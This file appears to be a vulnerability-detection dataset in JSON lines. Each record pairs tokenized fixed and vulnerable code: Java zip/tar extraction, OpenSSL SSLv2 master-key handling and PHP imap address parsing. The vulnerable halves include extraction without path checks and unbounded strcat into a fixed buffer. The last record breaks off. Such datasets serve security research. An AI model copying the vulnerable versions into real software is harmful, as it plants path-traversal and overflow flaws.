{"contents": ["empty"], "code_tokens": ["private", "final", "boolean", "symLinksDisabled", ";", "this", ".", "symLinksDisabled", "=", "(", "boolean", ")", "conf", ".", "getOrDefault", "(", "Config", ".", "DISABLE_SYMLINKS", ",", "false", ")", ";", "ServerUtils", ".", "unpack", "(", "downloadFile", ".", "toFile", "(", "),", "finalLocation", ".", "toFile", "(", "),", "symLinksDisabled", ")", ";", "import", "java", ".", "nio", ".", "file", ".", "LinkOption", ";", "import", "java", ".", "nio", ".", "file", ".", "Path", ";", "import", "java", ".", "nio", ".", "file", ".", "attribute", ".", "PosixFilePermission", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "Set", ";", "public", "static", "void", "unJar", "(", "File", "jarFile", ",", "File", "toDir", ")", "throws", "IOException", "{", "try", "(", "JarFile", "jar", "=", "new", "JarFile", "(", "jarFile", ")", ")", "{", "extractZipFile", "(", "jar", ",", "toDir", ",", "null", ")", ";", "*", "@", "param", "symlinksDisabled", "true", "if", "symlinks", "should", "be", "disabled", ",", "else", "false", ".", "public", "static", "void", "unTar", "(", "File", "inFile", ",", "File", "untarDir", ",", "boolean", "symlinksDisabled", ")", "throws", "IOException", "{", "ensureDirectory", "(", "untarDir", ")", ";", "if", "(", "Utils", ".", "isOnWindows", "(", ")", "|", "|", "symlinksDisabled", ")", "{", "unTarUsingJava", "(", "inFile", ",", "untarDir", ",", "gzipped", ",", "symlinksDisabled", ")", ";", "boolean", "gzipped", ",", "boolean", "symlinksDisabled", ")", "throws", "IOException", "{", "final", "String", "base", "=", "untarDir", ".", "getCanonicalPath", "(", ");", "LOG", ".", "trace", "(", "\"", "java", "untar", "{", "}", "to", "{", "}\"", ",", "inFile", ",", "base", ")", ";", "unpackEntries", "(", "tis", ",", "entry", ",", "untarDir", ",", "base", ",", "symlinksDisabled", ")", ";", "TarArchiveEntry", "entry", ",", "File", "outputDir", ",", "final", "String", "base", ",", "boolean", "symlinksDisabled", ")", "throws", "IOException", "{", "File", "target", "=", "new", "File", "(", "outputDir", ",", "entry", ".", "getName", "(", "))", ";", "String", "found", "=", "target", ".", "getCanonicalPath", "(", ");", "if", "(", "!", "found", ".", "startsWith", "(", "base", ")", ")", "{", "LOG", ".", "error", "(", "\"", "Invalid", "location", "{", "}", "is", "outside", "of", "{", "}\"", ",", "found", ",", "base", ")", ";", "return", ";", "}", "LOG", ".", "trace", "(", "\"", "Extracting", "dir", "{", "}\"", ",", "target", ")", ";", "ensureDirectory", "(", "target", ")", ";", "unpackEntries", "(", "tis", ",", "e", ",", "target", ",", "base", ",", "symlinksDisabled", ")", ";", "}", "else", "if", "(", "entry", ".", "isSymbolicLink", "(", "))", "{", "if", "(", "symlinksDisabled", ")", "{", "LOG", ".", "info", "(", "\"", "Symlinks", "disabled", "skipping", "{", "}\"", ",", "target", ")", ";", "}", "else", "{", "Path", "src", "=", "target", ".", "toPath", "(", ");", "Path", "dest", "=", "Paths", ".", "get", "(", "entry", ".", "getLinkName", "(", "))", ";", "LOG", ".", "trace", "(", "\"", "Extracting", "sym", "link", "{", "}", "to", "{", "}\"", ",", "target", ",", "dest", ")", ";", "/", "/", "Create", "symbolic", "link", "relative", "to", "tar", "parent", "dir", "Files", ".", "createSymbolicLink", "(", "src", ",", "dest", ")", ";", "}", "}", "else", "if", "(", "entry", ".", "isFile", "(", "))", "{", "LOG", ".", "trace", "(", "\"", "Extracting", "file", "{", "}\"", ",", "target", ")", ";", "ensureDirectory", "(", "target", ".", "getParentFile", "(", "))", ";", "try", "(", "BufferedOutputStream", "outputStream", "=", "new", "BufferedOutputStream", "(", "new", "FileOutputStream", "(", "target", ")", "))", "{", "IOUtils", ".", "copy", "(", "tis", ",", "outputStream", ")", ";", "}", "}", "else", "{", "LOG", ".", "error", "(", "\"{", "}", "is", "not", "a", "currently", "supported", "tar", "entry", "type", ".", "\",", "entry", ")", ";", "Path", "p", "=", "target", ".", "toPath", "(", ");", "if", "(", "Files", ".", "exists", "(", "p", ")", ")", "{", "try", "{", "/", "/", "We", "created", "it", "so", "lets", "chmod", "it", "properly", "int", "mode", "=", "entry", ".", "getMode", "(", ");", "Files", ".", "setPosixFilePermissions", "(", "p", ",", "parsePerms", "(", "mode", ")", ");", "}", "catch", "(", "UnsupportedOperationException", "e", ")", "{", "/", "/", "Ignored", "the", "file", "system", "we", "are", "on", "does", "not", "support", "this", ",", "so", "don", "'", "t", "do", "it", ".", "}", "private", "static", "Set", "<", "PosixFilePermission", ">", "parsePerms", "(", "int", "mode", ")", "{", "Set", "<", "PosixFilePermission", ">", "ret", "=", "new", "HashSet", "<", ">(", ");", "if", "(", "(", "mode", "&", "0001", ")", ">", "0", ")", "{", "ret", ".", "add", "(", "PosixFilePermission", ".", "OTHERS_EXECUTE", ")", ";", "}", "if", "(", "(", "mode", "&", "0002", ")", ">", "0", ")", "{", "ret", ".", "add", "(", "PosixFilePermission", ".", "OTHERS_WRITE", ")", ";", "}", "if", "(", "(", "mode", "&", "0004", ")", ">", "0", ")", "{", "ret", ".", "add", "(", "PosixFilePermission", ".", "OTHERS_READ", ")", ";", "}", "if", "(", "(", "mode", "&", "0010", ")", ">", "0", ")", "{", "ret", ".", "add", "(", "PosixFilePermission", ".", "GROUP_EXECUTE", ")", ";", "if", "(", "(", "mode", "&", "0020", ")", ">", "0", ")", "{", "ret", ".", "add", "(", "PosixFilePermission", ".", "GROUP_WRITE", ")", ";", "}", "if", "(", "(", "mode", "&", "0040", ")", ">", "0", ")", "{", "ret", ".", "add", "(", "PosixFilePermission", ".", "GROUP_READ", ")", ";", "}", "if", "(", "(", "mode", "&", "0100", ")", ">", "0", ")", "{", "ret", ".", "add", "(", "PosixFilePermission", ".", "OWNER_EXECUTE", ")", ";", "}", "if", "(", "(", "mode", "&", "0200", ")", ">", "0", ")", "{", "ret", ".", "add", "(", "PosixFilePermission", ".", "OWNER_WRITE", ")", ";", "}", "if", "(", "(", "mode", "&", "0400", ")", ">", "0", ")", "{", "ret", ".", "add", "(", "PosixFilePermission", ".", "OWNER_READ", ")", ";", "}", "return", "ret", ";", "public", "static", "void", "unpack", "(", "File", "localrsrc", ",", "File", "dst", ",", "boolean", "symLinksDisabled", ")", "throws", "IOException", "{", "if", "(", "lowerDst", ".", "endsWith", "(", "\".", "jar", "\"", ")", "|", "|", "lowerDst", ".", "endsWith", "(", "\"", "_jar", "\"", "))", "{", "}", "else", "if", "(", "lowerDst", ".", "endsWith", "(", "\".", "zip", "\"", ")", "|", "|", "lowerDst", ".", "endsWith", "(", "\"", "_zip", "\"", "))", "{", "lowerDst", ".", "endsWith", "(", "\"", "_tar_gz", "\"", ")", "|", "|", "lowerDst", ".", "endsWith", "(", "\".", "tgz", "\"", ")", "|", "|", "lowerDst", ".", "endsWith", "(", "\"", "_tgz", "\"", ")", "|", "|", "lowerDst", ".", "endsWith", "(", "\".", "tar", "\"", ")", "|", "|", "lowerDst", ".", "endsWith", "(", "\"", "_tar", "\"", "))", "{", "unTar", "(", "localrsrc", ",", "dst", ",", "symLinksDisabled", ")", ";", "private", "static", "void", "extractZipFile", "(", "ZipFile", "zipFile", ",", "File", "toDir", ",", "String", "prefix", ")", "throws", "IOException", "{", "ensureDirectory", "(", "toDir", ")", ";", "final", "String", "base", "=", "toDir", ".", "getCanonicalPath", "(", ");", "Enumeration", "<", "?", "extends", "ZipEntry", ">", "entries", "=", "zipFile", ".", "entries", "(", ");", "while", "(", "entries", ".", "hasMoreElements", "(", "))", "{", "ZipEntry", "entry", "=", "entries", ".", "nextElement", "(", ");", "if", "(", "!", "entry", ".", "isDirectory", "(", "))", "{", "if", "(", "prefix", "!", "=", "null", "&", "&", "!", "entry", ".", "getName", "(", ").", "startsWith", "(", "prefix", ")", ")", "{", "/", "/", "No", "need", "to", "extract", "it", ",", "it", "is", "not", "what", "we", "are", "looking", "for", ".", "continue", ";", "}", "File", "file", "=", "new", "File", "(", "toDir", ",", "entry", ".", "getName", "(", "))", ";", "String", "found", "=", "file", ".", "getCanonicalPath", "(", ");", "if", "(", "!", "found", ".", "startsWith", "(", "base", ")", ")", "{", "LOG", ".", "error", "(", "\"", "Invalid", "location", "{", "}", "is", "outside", "of", "{", "}\"", ",", "found", ",", "base", ")", ";", "continue", ";", "}", "try", "(", "InputStream", "in", "=", "zipFile", ".", "getInputStream", "(", "entry", ")", ")", "{", "ensureDirectory", "(", "file", ".", "getParentFile", "(", "))", ";", "try", "(", "OutputStream", "out", "=", "new", "FileOutputStream", "(", "file", ")", ")", "{", "IOUtils", ".", "copy", "(", "in", ",", "out", ")", ";", "}", "}", "}", "}", "}", "*", "Given", "a", "File", "input", "it", "will", "unzip", "the", "file", "in", "a", "the", "unzip", "directory", "passed", "as", "the", "second", "parameter", ".", "*", "@", "param", "toDir", "The", "unzip", "directory", "where", "to", "unzip", "the", "zip", "file", ".", "public", "static", "void", "unZip", "(", "File", "inFile", ",", "File", "toDir", ")", "throws", "IOException", "{", "try", "(", "ZipFile", "zipFile", "=", "new", "ZipFile", "(", "inFile", ")", ")", "{", "extractZipFile", "(", "zipFile", ",", "toDir", ",", "null", ")", ";", "extractZipFile", "(", "jarFile", ",", "destdir", ",", "dir", ")", ";</s>ServerUtils", ".", "unpack", "(", "downloadFile", ".", "toFile", "(", "),", "finalLocation", ".", "toFile", "(", "))", ";", "public", "static", "void", "unJar", "(", "File", "jarFile", ",", "File", "toDir", ")", "throws", "IOException", "{", "JarFile", "jar", "=", "new", "JarFile", "(", "jarFile", ")", ";", "try", "{", "Enumeration", "<", "JarEntry", ">", "entries", "=", "jar", ".", "entries", "(", ");", "while", "(", "entries", ".", "hasMoreElements", "(", "))", "{", "final", "JarEntry", "entry", "=", "entries", ".", "nextElement", "(", ");", "if", "(", "!", "entry", ".", "isDirectory", "(", "))", "{", "InputStream", "in", "=", "jar", ".", "getInputStream", "(", "entry", ")", ";", "try", "{", "File", "file", "=", "new", "File", "(", "toDir", ",", "entry", ".", "getName", "(", "))", ";", "ensureDirectory", "(", "file", ".", "getParentFile", "(", "))", ";", "OutputStream", "out", "=", "new", "FileOutputStream", "(", "file", ")", ";", "try", "{", "copyBytes", "(", "in", ",", "out", ",", "8192", ")", ";", "}", "finally", "{", "out", ".", "close", "(", ");", "}", "}", "finally", "{", "in", ".", "close", "(", ");", "}", "}", "}", "}", "finally", "{", "jar", ".", "close", "(", ");", "}", "}", "/", "**", "*", "Copies", "from", "one", "stream", "to", "another", ".", "*", "*", "@", "param", "in", "InputStream", "to", "read", "from", "*", "@", "param", "out", "OutputStream", "to", "write", "to", "*", "@", "param", "buffSize", "the", "size", "of", "the", "buffer", "*", "/", "public", "static", "void", "copyBytes", "(", "InputStream", "in", ",", "OutputStream", "out", ",", "int", "buffSize", ")", "throws", "IOException", "{", "PrintStream", "ps", "=", "out", "instanceof", "PrintStream", "?", "(", "PrintStream", ")", "out", ":", "null", ";", "byte", "buf", "[", "]", "=", "new", "byte", "[", "buffSize", "]", ";", "int", "bytesRead", "=", "in", ".", "read", "(", "buf", ")", ";", "while", "(", "bytesRead", ">", "=", "0", ")", "{", "out", ".", "write", "(", "buf", ",", "0", ",", "bytesRead", ")", ";", "if", "(", "(", "ps", "!", "=", "null", ")", "&", "&", "ps", ".", "checkError", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "Unable", "to", "write", "to", "output", "stream", ".", "\")", ";", "}", "bytesRead", "=", "in", ".", "read", "(", "buf", ")", ";", "public", "static", "void", "unTar", "(", "File", "inFile", ",", "File", "untarDir", ")", "throws", "IOException", "{", "if", "(", "!", "untarDir", ".", "mkdirs", "(", "))", "{", "if", "(", "!", "untarDir", ".", "isDirectory", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "Mkdirs", "failed", "to", "create", "\"", "+", "untarDir", ")", ";", "}", "}", "if", "(", "Utils", ".", "isOnWindows", "(", "))", "{", "unTarUsingJava", "(", "inFile", ",", "untarDir", ",", "gzipped", ")", ";", "boolean", "gzipped", ")", "throws", "IOException", "{", "unpackEntries", "(", "tis", ",", "entry", ",", "untarDir", ")", ";", "TarArchiveEntry", "entry", ",", "File", "outputDir", ")", "throws", "IOException", "{", "File", "subDir", "=", "new", "File", "(", "outputDir", ",", "entry", ".", "getName", "(", "))", ";", "if", "(", "!", "subDir", ".", "mkdirs", "(", ")", "&", "&", "!", "subDir", ".", "isDirectory", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "Mkdirs", "failed", "to", "create", "tar", "internal", "dir", "\"", "+", "outputDir", ")", ";", "}", "unpackEntries", "(", "tis", ",", "e", ",", "subDir", ")", ";", "return", ";", "File", "outputFile", "=", "new", "File", "(", "outputDir", ",", "entry", ".", "getName", "(", "))", ";", "if", "(", "!", "outputFile", ".", "getParentFile", "(", ").", "exists", "(", "))", "{", "if", "(", "!", "outputFile", ".", "getParentFile", "(", ").", "mkdirs", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "Mkdirs", "failed", "to", "create", "tar", "internal", "dir", "\"", "+", "outputDir", ")", ";", "int", "count", ";", "byte", "data", "[", "]", "=", "new", "byte", "[", "2048", "]", ";", "BufferedOutputStream", "outputStream", "=", "new", "BufferedOutputStream", "(", "new", "FileOutputStream", "(", "outputFile", ")", ");", "while", "(", "(", "count", "=", "tis", ".", "read", "(", "data", ")", ")", "!", "=", "-", "1", ")", "{", "outputStream", ".", "write", "(", "data", ",", "0", ",", "count", ")", ";", "outputStream", ".", "flush", "(", ");", "outputStream", ".", "close", "(", ");", "public", "static", "void", "unpack", "(", "File", "localrsrc", ",", "File", "dst", ")", "throws", "IOException", "{", "if", "(", "lowerDst", ".", "endsWith", "(", "\".", "jar", "\"", "))", "{", "}", "else", "if", "(", "lowerDst", ".", "endsWith", "(", "\".", "zip", "\"", "))", "{", "lowerDst", ".", "endsWith", "(", "\".", "tgz", "\"", ")", "|", "|", "lowerDst", ".", "endsWith", "(", "\".", "tar", "\"", "))", "{", "unTar", "(", "localrsrc", ",", "dst", ")", ";", "*", "Given", "a", "File", "input", "it", "will", "unzip", "the", "file", "in", "a", "the", "unzip", "directory", "passed", "as", "the", "second", "parameter", "*", "@", "param", "unzipDir", "The", "unzip", "directory", "where", "to", "unzip", "the", "zip", "file", ".", "public", "static", "void", "unZip", "(", "File", "inFile", ",", "File", "unzipDir", ")", "throws", "IOException", "{", "Enumeration", "<", "?", "extends", "ZipEntry", ">", "entries", ";", "ZipFile", "zipFile", "=", "new", "ZipFile", "(", "inFile", ")", ";", "try", "{", "entries", "=", "zipFile", ".", "entries", "(", ");", "while", "(", "entries", ".", "hasMoreElements", "(", "))", "{", "ZipEntry", "entry", "=", "entries", ".", "nextElement", "(", ");", "if", "(", "!", "entry", ".", "isDirectory", "(", "))", "{", "InputStream", "in", "=", "zipFile", ".", "getInputStream", "(", "entry", ")", ";", "try", "{", "File", "file", "=", "new", "File", "(", "unzipDir", ",", "entry", ".", "getName", "(", "))", ";", "if", "(", "!", "file", ".", "getParentFile", "(", ").", "mkdirs", "(", "))", "{", "if", "(", "!", "file", ".", "getParentFile", "(", ").", "isDirectory", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "Mkdirs", "failed", "to", "create", "\"", "+", "file", ".", "getParentFile", "(", ").", "toString", "(", "))", ";", "}", "}", "OutputStream", "out", "=", "new", "FileOutputStream", "(", "file", ")", ";", "try", "{", "byte", "[", "]", "buffer", "=", "new", "byte", "[", "8192", "]", ";", "int", "i", ";", "while", "(", "(", "i", "=", "in", ".", "read", "(", "buffer", ")", ")", "!", "=", "-", "1", ")", "{", "out", ".", "write", "(", "buffer", ",", "0", ",", "i", ")", ";", "}", "}", "finally", "{", "out", ".", "close", "(", ");", "}", "}", "finally", "{", "in", ".", "close", "(", ");", "}", "}", "}", "}", "finally", "{", "zipFile", ".", "close", "(", ");", "Enumeration", "<", "JarEntry", ">", "jarEnums", "=", "jarFile", ".", "entries", "(", ");", "while", "(", "jarEnums", ".", "hasMoreElements", "(", "))", "{", "JarEntry", "entry", "=", "jarEnums", ".", "nextElement", "(", ");", "if", "(", "!", "entry", ".", "isDirectory", "(", ")", "&", "&", "entry", ".", "getName", "(", ").", "startsWith", "(", "dir", ")", ")", "{", "File", "aFile", "=", "new", "File", "(", "destdir", ",", "entry", ".", "getName", "(", "))", ";", "aFile", ".", "getParentFile", "(", ").", "mkdirs", "(", ");", "try", "(", "FileOutputStream", "out", "=", "new", "FileOutputStream", "(", "aFile", ")", ";", "InputStream", "in", "=", "jarFile", ".", "getInputStream", "(", "entry", ")", ")", "{", "IOUtils", ".", "copy", "(", "in", ",", "out", ")", ";", "}", "}", "}"], "docstring_tokens": ["using", "a", "specially", "crafted", "zip", "archive"]}
{"contents": ["empty"], "code_tokens": ["<", "=", "(", "int", ")", "sizeof", "(", "s", "-", ">", "session", "-", ">", "master_key", ")", ");", "/", "*", "*", "The", "format", "of", "the", "CLIENT", "-", "MASTER", "-", "KEY", "message", "is", "*", "1", "byte", "message", "type", "*", "3", "bytes", "cipher", "*", "2", "-", "byte", "clear", "key", "length", "(", "stored", "in", "s", "-", ">", "s2", "-", ">", "tmp", ".", "clear", ")", "*", "2", "-", "byte", "encrypted", "key", "length", "(", "stored", "in", "s", "-", ">", "s2", "-", ">", "tmp", ".", "enc", ")", "*", "2", "-", "byte", "key", "args", "length", "(", "IV", "etc", ")", "*", "clear", "key", "*", "encrypted", "key", "*", "key", "args", "*", "*", "If", "the", "cipher", "is", "an", "export", "cipher", ",", "then", "the", "encrypted", "key", "bytes", "*", "are", "a", "fixed", "portion", "of", "the", "total", "key", "(", "5", "or", "8", "bytes", ")", ".", "The", "size", "of", "*", "this", "portion", "is", "in", "|", "ek", "|", ".", "If", "the", "cipher", "is", "not", "an", "export", "cipher", ",", "*", "then", "the", "entire", "key", "material", "is", "encrypted", "(", "i", ".", "e", ".", ",", "clear", "key", "length", "*", "must", "be", "zero", ")", ".", "*", "/", "if", "(", "(!", "is_export", "&", "&", "s", "-", ">", "s2", "-", ">", "tmp", ".", "clear", "!", "=", "0", ")", "|", "|", "(", "is_export", "&", "&", "s", "-", ">", "s2", "-", ">", "tmp", ".", "clear", "+", "ek", "!", "=", "EVP_CIPHER_key_length", "(", "c", ")", "))", "{", "ssl2_return_error", "(", "s", ",", "SSL2_PE_UNDEFINED_ERROR", ")", ";", "SSLerr", "(", "SSL_F_GET_CLIENT_MASTER_KEY", ",", "SSL_R_BAD_LENGTH", ")", ";", "return", "-", "1", ";", "}", "/", "*", "*", "The", "encrypted", "blob", "must", "decrypt", "to", "the", "encrypted", "portion", "of", "the", "key", ".", "*", "Decryption", "can", "'", "t", "be", "expanding", ",", "so", "if", "we", "don", "'", "t", "have", "enough", "encrypted", "*", "bytes", "to", "fit", "the", "key", "in", "the", "buffer", ",", "stop", "now", ".", "*", "/", "if", "(", "(", "is_export", "&", "&", "s", "-", ">", "s2", "-", ">", "tmp", ".", "enc", "<", "ek", ")", "|", "|", "(", "!", "is_export", "&", "&", "s", "-", ">", "s2", "-", ">", "tmp", ".", "enc", "<", "EVP_CIPHER_key_length", "(", "c", ")", "))", "{", "ssl2_return_error", "(", "s", ",", "SSL2_PE_UNDEFINED_ERROR", ")", ";", "SSLerr", "(", "SSL_F_GET_CLIENT_MASTER_KEY", ",", "SSL_R_LENGTH_TOO_SHORT", ")", ";", "return", "-", "1", ";", "}", "i", "=", "ssl_rsa_private_decrypt", "(", "s", "-", ">", "cert", ",", "s", "-", ">", "s2", "-", ">", "tmp", ".", "enc", ",", "&", "(", "p", "[", "s", "-", ">", "s2", "-", ">", "tmp", ".", "clear", "]", "),", "&", "(", "p", "[", "s", "-", ">", "s2", "-", ">", "tmp", ".", "clear", "]", "),", "(", "s", "-", ">", "s2", "-", ">", "ssl2_rollback", ")", "?", "RSA_SSLV23_PADDING", ":", "RSA_PKCS1_PADDING", ")", ";", "if", "(", "(", "i", "<", "0", ")", "|", "|", "(", "(!", "is_export", "&", "&", "i", "!", "=", "EVP_CIPHER_key_length", "(", "c", ")", ")", "|", "|", "(", "is_export", "&", "&", "i", "!", "=", "ek", ")", "))", "{", "if", "(", "RAND_pseudo_bytes", "(", "&", "p", "[", "s", "-", ">", "s2", "-", ">", "tmp", ".", "clear", "]", ",", "i", ")", "<", "=", "0", ")", "i", "=", "EVP_CIPHER_key_length", "(", "c", ")", ";</s><", "(", "int", ")", "sizeof", "(", "s", "-", ">", "session", "-", ">", "master_key", ")", ");", "i", "=", "ssl_rsa_private_decrypt", "(", "s", "-", ">", "cert", ",", "s", "-", ">", "s2", "-", ">", "tmp", ".", "enc", ",", "&", "(", "p", "[", "s", "-", ">", "s2", "-", ">", "tmp", ".", "clear", "]", "),", "&", "(", "p", "[", "s", "-", ">", "s2", "-", ">", "tmp", ".", "clear", "]", "),", "(", "s", "-", ">", "s2", "-", ">", "ssl2_rollback", ")", "?", "RSA_SSLV23_PADDING", ":", "RSA_PKCS1_PADDING", ")", ";", "if", "(", "(", "i", "<", "0", ")", "|", "|", "(", "(!", "is_export", "&", "&", "(", "i", "!", "=", "EVP_CIPHER_key_length", "(", "c", ")", "))", "|", "|", "(", "is_export", "&", "&", "(", "(", "i", "!", "=", "ek", ")", "|", "|", "(", "s", "-", ">", "s2", "-", ">", "tmp", ".", "clear", "+", "(", "unsigned", "int", ")", "i", "!", "=", "(", "unsigned", "int", ")", "EVP_CIPHER_key_length", "(", "c", ")", "))", "))", ")", "{", "if", "(", "RAND_pseudo_bytes", "(", "p", ",", "i", ")", "<", "=", "0", ")", "i", "+", "=", "s", "-", ">", "s2", "-", ">", "tmp", ".", "clear", ";"], "docstring_tokens": ["via", "a", "crafted", "CLIENT-MASTER-KEY", "message", "."]}
{"contents": ["empty"], "code_tokens": ["static", "void", "_php_imap_parse_address", "(", "ADDRESS", "*", "addresslist", ",", "char", "*", "*", "fulladdress", ",", "zval", "*", "paddress", "TSRMLS_DC", ")", ";", "static", "int", "_php_imap_address_size", "(", "ADDRESS", "*", "addresslist", ")", ";", "/", "*", "{", "{{", "_php_imap_get_address_size", "*", "/", "static", "int", "_php_imap_address_size", "(", "ADDRESS", "*", "addresslist", ")", "{", "ADDRESS", "*", "tmp", ";", "int", "ret", "=", "0", ";", "tmp", "=", "addresslist", ";", "if", "(", "tmp", ")", "do", "{", "ret", "+", "=", "(", "tmp", "-", ">", "personal", ")", "?", "strlen", "(", "tmp", "-", ">", "personal", ")", ":", "0", ";", "ret", "+", "=", "(", "tmp", "-", ">", "adl", ")", "?", "strlen", "(", "tmp", "-", ">", "adl", ")", ":", "0", ";", "ret", "+", "=", "(", "tmp", "-", ">", "mailbox", ")", "?", "strlen", "(", "tmp", "-", ">", "mailbox", ")", ":", "0", ";", "ret", "+", "=", "(", "tmp", "-", ">", "host", ")", "?", "strlen", "(", "tmp", "-", ">", "host", ")", ":", "0", ";", "}", "while", "(", "(", "tmp", "=", "tmp", "-", ">", "next", ")", ");", "/", "*", "rfc822_write_address_full", "(", ")", "needs", "some", "extra", "space", "for", "'", "<>", ",'", ",", "etc", ".", "*", "/", "ret", "+", "=", "(", "ret", ")", "?", "MAILTMPLEN", ":", "0", ";", "return", "ret", ";", "}", "/", "*", "}", "}}", "*", "/", "static", "void", "_php_imap_parse_address", "(", "ADDRESS", "*", "addresslist", ",", "char", "*", "*", "fulladdress", ",", "zval", "*", "paddress", "TSRMLS_DC", ")", "ADDRESS", "*", "addresstmp", ";", "char", "*", "tmpstr", ";", "int", "len", "=", "0", ";", "if", "(", "(", "len", "=", "_php_imap_address_size", "(", "addresstmp", ")", "))", "{", "tmpstr", "=", "(", "char", "*", ")", "malloc", "(", "len", ")", ";", "tmpstr", "[", "0", "]", "=", "'", "\\", "0", "'", ";", "rfc822_write_address", "(", "tmpstr", ",", "addresstmp", ")", ";", "*", "fulladdress", "=", "tmpstr", ";", "char", "*", "fulladdress", "=", "NULL", ";", "_php_imap_parse_address", "(", "en", "-", ">", "to", ",", "&", "fulladdress", ",", "paddress", "TSRMLS_CC", ")", ";", "if", "(", "fulladdress", ")", "{", "add_property_string", "(", "myzvalue", ",", "\"", "toaddress", "\"", ",", "fulladdress", ",", "1", ")", ";", "free", "(", "fulladdress", ")", ";", "}", "_php_imap_parse_address", "(", "en", "-", ">", "from", ",", "&", "fulladdress", ",", "paddress", "TSRMLS_CC", ")", ";", "if", "(", "fulladdress", ")", "{", "add_property_string", "(", "myzvalue", ",", "\"", "fromaddress", "\"", ",", "fulladdress", ",", "1", ")", ";", "free", "(", "fulladdress", ")", ";", "}", "_php_imap_parse_address", "(", "en", "-", ">", "cc", ",", "&", "fulladdress", ",", "paddress", "TSRMLS_CC", ")", ";", "if", "(", "fulladdress", ")", "{", "add_property_string", "(", "myzvalue", ",", "\"", "ccaddress", "\"", ",", "fulladdress", ",", "1", ")", ";", "free", "(", "fulladdress", ")", ";", "}", "_php_imap_parse_address", "(", "en", "-", ">", "bcc", ",", "&", "fulladdress", ",", "paddress", "TSRMLS_CC", ")", ";", "if", "(", "fulladdress", ")", "{", "add_property_string", "(", "myzvalue", ",", "\"", "bccaddress", "\"", ",", "fulladdress", ",", "1", ")", ";", "free", "(", "fulladdress", ")", ";", "}", "_php_imap_parse_address", "(", "en", "-", ">", "reply_to", ",", "&", "fulladdress", ",", "paddress", "TSRMLS_CC", ")", ";", "if", "(", "fulladdress", ")", "{", "add_property_string", "(", "myzvalue", ",", "\"", "reply_toaddress", "\"", ",", "fulladdress", ",", "1", ")", ";", "free", "(", "fulladdress", ")", ";", "}", "_php_imap_parse_address", "(", "en", "-", ">", "sender", ",", "&", "fulladdress", ",", "paddress", "TSRMLS_CC", ")", ";", "if", "(", "fulladdress", ")", "{", "add_property_string", "(", "myzvalue", ",", "\"", "senderaddress", "\"", ",", "fulladdress", ",", "1", ")", ";", "free", "(", "fulladdress", ")", ";", "}", "_php_imap_parse_address", "(", "en", "-", ">", "return_path", ",", "&", "fulladdress", ",", "paddress", "TSRMLS_CC", ")", ";", "if", "(", "fulladdress", ")", "{", "add_property_string", "(", "myzvalue", ",", "\"", "return_pathaddress", "\"", ",", "fulladdress", ",", "1", ")", ";", "free", "(", "fulladdress", ")", ";", "}</s>static", "void", "_php_imap_parse_address", "(", "ADDRESS", "*", "addresslist", ",", "char", "*", "fulladdress", ",", "zval", "*", "paddress", "TSRMLS_DC", ")", ";", "static", "void", "_php_imap_parse_address", "(", "ADDRESS", "*", "addresslist", ",", "char", "*", "fulladdress", ",", "zval", "*", "paddress", "TSRMLS_DC", ")", "ADDRESS", "*", "addresstmp", ",", "*", "addresstmp2", ";", "char", "tempaddress", "[", "MAILTMPLEN", "]", ";", "int", "ok", "=", "1", ";", "fulladdress", "[", "0", "]", "=", "0x00", ";", "while", "(", "ok", "&", "&", "addresstmp", ")", "{", "/", "*", "while", "length", "<", "1000", "and", "we", "are", "not", "at", "the", "end", "of", "the", "list", "*", "/", "addresstmp2", "=", "addresstmp", "-", ">", "next", ";", "/", "*", "save", "the", "pointer", "to", "the", "next", "address", "*", "/", "addresstmp", "-", ">", "next", "=", "NULL", ";", "/", "*", "make", "this", "address", "the", "only", "one", "now", ".", "*", "/", "tempaddress", "[", "0", "]", "=", "'", "\\", "0", "'", ";", "/", "*", "reset", "tempaddress", "buffer", "*", "/", "rfc822_write_address", "(", "tempaddress", ",", "addresstmp", ")", ";", "/", "*", "ok", ",", "write", "the", "address", "into", "tempaddress", "string", "*", "/", "if", "(", "(", "strlen", "(", "tempaddress", ")", "+", "strlen", "(", "fulladdress", ")", ")", "<", "1000", ")", "{", "/", "*", "is", "the", "new", "address", "+", "total", "address", "<", "1000", "*", "/", "if", "(", "strlen", "(", "fulladdress", ")", ")", "{", "strcat", "(", "fulladdress", ",", "\"", ",\"", ");", "/", "*", "put", "in", "a", "comma", "*", "/", "}", "strcat", "(", "fulladdress", ",", "tempaddress", ")", ";", "/", "*", "put", "in", "the", "new", "address", "*", "/", "}", "else", "{", "/", "*", "no", "*", "/", "ok", "=", "0", ";", "/", "*", "stop", "looping", "*", "/", "strcat", "(", "fulladdress", ",", "\"", ",", ".", "..", "\")", ";", "}", "/", "*", "DO", "NOT", "optimize", "this", "out", "-", "changing", "it", "breaks", "things", "*", "/", "addresstmp", "-", ">", "next", "=", "addresstmp2", ";", "/", "*", "reset", "the", "pointer", "to", "the", "next", "address", "first", "!", "*", "/", "addresstmp", "=", "addresstmp", "-", ">", "next", ";", "char", "fulladdress", "[", "MAILTMPLEN", "]", ";", "_php_imap_parse_address", "(", "en", "-", ">", "to", ",", "fulladdress", ",", "paddress", "TSRMLS_CC", ")", ";", "if", "(", "fulladdress", ")", "add_property_string", "(", "myzvalue", ",", "\"", "toaddress", "\"", ",", "fulladdress", ",", "1", ")", ";", "_php_imap_parse_address", "(", "en", "-", ">", "from", ",", "fulladdress", ",", "paddress", "TSRMLS_CC", ")", ";", "if", "(", "fulladdress", ")", "add_property_string", "(", "myzvalue", ",", "\"", "fromaddress", "\"", ",", "fulladdress", ",", "1", ")", ";", "_php_imap_parse_address", "(", "en", "-", ">", "cc", ",", "fulladdress", ",", "paddress", "TSRMLS_CC", ")", ";", "if", "(", "fulladdress", ")", "add_property_string", "(", "myzvalue", ",", "\"", "ccaddress", "\"", ",", "fulladdress", ",", "1", ")", ";", "_php_imap_parse_address", "(", "en", "-", ">", "bcc", ",", "fulladdress", ",", "paddress", "TSRMLS_CC", ")", ";", "if", "(", "fulladdress", ")", "add_property_string", "(", "myzvalue", ",", "\"", "bccaddress", "\"", ",", "fulladdress", ",", "1", ")", ";", "_php_imap_parse_address", "(", "en", "-", ">", "reply_to", ",", "fulladdress", ",", "paddress", "TSRMLS_CC", ")", ";", "if", "(", "fulladdress", ")", "add_property_string", "(", "myzvalue", ",", "\"", 